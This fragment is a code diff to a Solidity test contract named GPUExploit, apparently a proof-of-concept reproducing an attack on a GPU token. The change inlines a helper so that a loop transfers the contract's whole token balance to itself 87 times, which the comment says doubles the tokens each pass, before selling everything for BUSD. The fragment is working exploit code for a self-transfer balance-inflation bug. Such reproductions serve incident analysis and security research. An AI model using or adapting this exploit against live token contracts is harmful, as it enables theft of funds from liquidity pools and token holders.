@@ -48,7 +48,7 @@ contract GPUExploit is Test {
 
         //Self transfer tokens to double tokens on each transfer
         for (uint256 i = 0; i < 87; i++) {
-            selfTransfer(gpuToken);
+            gpuToken.transfer(address(this), getBalance(gpuToken));
         }
 
         //Sell all tokens to busd
@@ -67,9 +67,5 @@ contract GPUExploit is Test {
 
     function getBalance(IERC20 token) private view returns (uint256) {
         return token.balanceOf(address(this));
-    }
-
-    function selfTransfer(IERC20 token) internal {
-        token.transfer(address(this), getBalance(gpuToken));
     }
 }
